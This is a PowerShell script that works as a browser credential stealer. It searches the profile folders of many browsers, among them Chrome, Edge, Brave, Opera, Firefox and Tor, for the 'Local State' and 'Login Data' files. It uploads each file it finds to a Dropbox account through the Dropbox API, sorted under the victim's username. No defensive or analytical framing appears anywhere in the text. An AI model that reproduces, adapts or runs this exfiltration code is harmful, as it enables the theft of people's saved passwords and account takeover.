
# Specify the path to the Local State file
$paths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\",
    "$env:LOCALAPPDATA\Mozilla\Firefox\\Profiles\",
    "$env:APPDATA\Opera Software\Opera Stable\",
    "$env:APPDATA\Opera Software\Opera GX\",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\",
    "$env:LOCALAPPDATA\Vivaldi\User Data\",
    "$env:LOCALAPPDATA\Apple Computer\Safari\",
    "$env:LOCALAPPDATA\Tor Browser\Browser\TorBrowser\Data\Browser\profile",
    "$env:LOCALAPPDATA\Maxthon3\Users\",
    "$env:LOCALAPPDATA\Epic Privacy Browser\User Data\",
    "$env:LOCALAPPDATA\AVAST Software\Browser\User Data\",
    "$env:LOCALAPPDATA\Chromium\User Data\",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\",
    "$env:LOCALAPPDATA\CentBrowser\User Data\",
    "$env:LOCALAPPDATA\Chromium\User Data\"

)

$files = @(
    "Local State",
    "Login Data"
)


function Get-CurrentUser {
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    return $currentUser.Name
}

$currentUser = Get-CurrentUser
$currentUser = $currentUser -replace "\\", "-"


function Upload-ToDropbox {
    Param(
        [Parameter(Mandatory = $true)]
        [string]$FilePath,
        [Parameter(Mandatory = $true)]
        [string]$DestinationPath
    )

    $dropboxApiArg = @{
        "autorename" = $true
        "mode" = "add"
        "mute" = $false
        "path" = "/$(${DestinationPath} -replace "\\", "/")"
        "strict_conflict" = $false
    }


    $dropboxApiArgJson = $dropboxApiArg | ConvertTo-Json -Compress
    $dropboxApiArgJson = $dropboxApiArgJson -replace "`r`n", ""
    $FilePath = $FilePath -replace "\\", "/"
    # Send the file content over HTTPS

    $headers = @{
        "Authorization" = "Bearer $AccessToken"
        "Dropbox-API-Arg" = $dropboxApiArgJson
    }

    Invoke-WebRequest -Uri "https://content.dropboxapi.com/2/files/upload" `
        -Method Post `
        -Headers $headers `
        -ContentType "application/octet-stream" `
        -InFile $FilePath
}

foreach ($path in $paths) {
    try {
        foreach ($file in $files) {
            try {
                $fullPath = Join-Path -Path $path -ChildPath $file
                $parentDirectory = Split-Path -Path $fullPath -Parent
                $grandParentDirectory = Split-Path -Path $parentDirectory -Parent
                $greatGrandParentDirectory = Split-Path -Path $grandParentDirectory -Parent
                $relativePath = $fullPath.Replace($greatGrandParentDirectory + "\", "")
                $OutPath = Join-Path -Path $currentUser -ChildPath $relativePath
                Upload-ToDropbox -FilePath $fullPath -DestinationPath $OutPath
            } catch {
                Write-Output "Failed processing file: $_"
            } 
        }
    } catch {
        Write-Output "Failed processing path: $_"
    }
}

